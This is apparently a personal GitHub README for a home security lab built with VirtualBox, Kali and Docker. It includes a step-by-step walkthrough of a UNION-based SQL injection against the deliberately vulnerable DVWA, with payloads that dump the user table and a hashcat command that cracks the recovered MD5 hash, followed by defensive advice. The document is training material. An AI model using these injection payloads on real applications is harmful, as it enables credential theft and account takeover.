# Cybersecurity_Home_Lab

A personal cyber security lab built from scratch on an 8 GB Windows host using Oracle VirtualBox, Kali Linux, and Docker-based vulnerable applications. The lab is used to practice offensive security techniques including reconnaissance, web application exploitation, and password cracking.

This repository documents the lab architecture, the setup steps required to reproduce it, and a hands-on walkthrough of a SQL injection exploit performed against DVWA (Damn Vulnerable Web Application).

## Why I built this

I am preparing for an entry-level cyber security role and wanted a hands-on environment where I could safely practice the offensive techniques that real attackers use. Reading about SQL injection is one thing — extracting password hashes from a live database with a crafted payload is what makes the concept stick. This lab is the foundation I will build my other security projects on.

The lab uses a ontainerized target approach instead of a separate target VM. Running vulnerable applications inside Docker on the Kali VM consumes far less RAM than a second VM (critical on an 8 GB system), starts in seconds, and reflects how modern professional security testing environments are built.

## Tools and technologies

| Layer | Tool |
|-------|------|
| Hypervisor | Oracle VirtualBox 7.2.8 |
| Attacker OS | Kali Linux 2026.1 (rolling) |
| Containerization | Docker Engine 28.5 |
| Target application | DVWA (Damn Vulnerable Web Application) |
| Browser | Firefox |
| Password cracking | hashcat with the rockyou.txt wordlist |
| Network analysis | nmap, Wireshark |



## Lab setup — how to reproduce

### 1. Host prerequisites
- 8 GB RAM minimum (3 GB allocated to Kali, ~5 GB reserved for the host)
- 100 GB free disk space
- Hardware virtualization (Intel VT-x / AMD-V) enabled in BIOS

### 2. Install VirtualBox
- Download VirtualBox 7.2.x from https://www.virtualbox.org/
- Install the Extension Pack for USB and remote display support

### 3. Install Kali Linux
- Download the pre-built VirtualBox image from https://www.kali.org/get-kali/
- Extract the `.7z` archive with 7-Zip
- Import the `.vbox` file into VirtualBox
- Tune the VM: 3 GB RAM, 2 vCPUs, 64 MB video memory
- Default credentials: `kali` / `kali`

### 4. Install Docker on Kali
```bash
sudo apt update
sudo apt install -y docker.io docker-compose
sudo systemctl enable docker --now
sudo usermod -aG docker $USER
# Log out and log back in for group membership to take effect
docker --version
```

### 5. Spin up DVWA
```bash
docker run -d --name dvwa -p 80:80 vulnerables/web-dvwa
```

Browse to `http://127.0.0.1` from Firefox inside Kali.

Login: `admin` / `password`. Click **Create / Reset Database**, then log in again.

## Walkthrough — SQL Injection on DVWA

**Objective:** Extract every user's password hash from the DVWA database through a SQL injection in the User ID lookup form.

**Security level:** Low (intentionally vulnerable for learning).

### Step 1 — Baseline behaviour
Submitting `1` returns the user record for ID 1 (admin). This establishes how the form is supposed to work.


### Step 2 — Confirm injection is possible
Payload:
```
1' OR '1'='1
```
The application returns **every user** in the database instead of one, confirming the input is concatenated directly into a SQL query without sanitisation.


### Step 3 — Discover the column count
By appending `ORDER BY n` and incrementing `n`, the response changes from a successful query to an "Unknown column" error when `n` exceeds the number of columns selected.

```
1' ORDER BY 2#   --> valid
1' ORDER BY 3#   --> error: unknown column '3'
```
Result: the underlying query selects **2 columns**.

### Step 4 — Information disclosure
Using the column count, a UNION-based attack extracts the database name and version:
```
1' UNION SELECT database(), version()#
```
Returns: database `dvwa`, MySQL version `5.5.x`.


### Step 5 — Enumerate tables
```
1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema='dvwa'#
```
Returns: `guestbook`, `users`.


### Step 6 — Dump credentials
```
1' UNION SELECT user, password FROM users#
```
Returns every username and its MD5 password hash, including admin's hash `5f4dcc3b5aa765d61d8327deb882cf99`.


### Step 7 — Crack the hash offline
```bash
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```
hashcat recovers the plaintext: `password`.


---

## What an attacker just achieved

Starting from nothing but a public input field, an attacker has:
1. Confirmed the application is vulnerable to SQL injection.
2. Enumerated the database schema.
3. Extracted every user's credentials.
4. Cracked the administrator's password offline.

This is exactly the chain used in many real-world data breaches.

---

## How a developer should defend against this

1. **Use parameterised queries / prepared statements.** Concatenating user input into SQL is the root cause.
2. **Apply least-privilege database accounts** so the application user cannot read system tables like `information_schema`.
3. **Hash passwords with a slow, salted algorithm** such as bcrypt or Argon2, not raw MD5.
4. **Add a Web Application Firewall (WAF)** for defence in depth.
5. **Validate and allow-list input types** (e.g. an ID field should only accept integers).

---

## What I learnt

- How VirtualBox networking, RAM allocation, and snapshots work in practice.
- The difference between IDE and SATA storage controllers (encountered during Metasploitable troubleshooting before pivoting to Docker).
- Why Docker is preferable to a second VM for resource-constrained lab hosts.
- How a UNION-based SQL injection is built up step by step.
- How hashcat works with wordlist attacks against MD5.
- Why insecure password hashing turns a single SQL injection into a full account takeover.


